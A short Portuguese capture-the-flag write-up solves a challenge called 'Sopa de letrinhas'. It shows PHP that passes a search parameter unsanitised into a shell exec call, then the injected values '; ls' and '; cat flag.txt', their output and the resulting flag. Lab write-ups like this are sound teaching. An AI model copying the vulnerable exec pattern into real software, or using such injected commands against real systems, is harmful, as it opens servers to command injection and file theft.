# Sopa de letrinhas

## Alex:

**Flag:** `Ganesh{fL46_!5N7_iN_Dic7}`

Ao entrar na página fiz alguns testes e percebi que provavelmente tinha um banco de palavras. Tentei achar a flag enviando um "Ganesh" como busca, para ver se retornava algo, mas não retornou nada. Então a flag devia estar escondida em algum outro lugar.

Abri então o código fonte e vi que possuía o código fonte do php, que basicamente recebia o que estava na query e enviava um comando para o shell executar.

```php
$query = trim($_GET["q"]);
$results = [ ];

if(!empty($query)) {
    exec("cat list.txt | grep " . $query, $results);
}
```

Então comecei tentando ver os arquivos que o diretório possuia por meio do ls, mandando a seguinte query: `; ls`. O `;` é para quebrar o comando anterior, que é o `grep` do `cat` da `list.txt`.

Então a página me retornou o seguinte:

```text
3 resultados encontrados:

flag.txt
index.php
list.txt
```

Ao dar um `cat` da `flag.txt` \(`; cat flag.txt`\) a página me retornou:

```text
1 resultados encontrados:

Ganesh{fL46_!5N7_iN_Dic7}
```

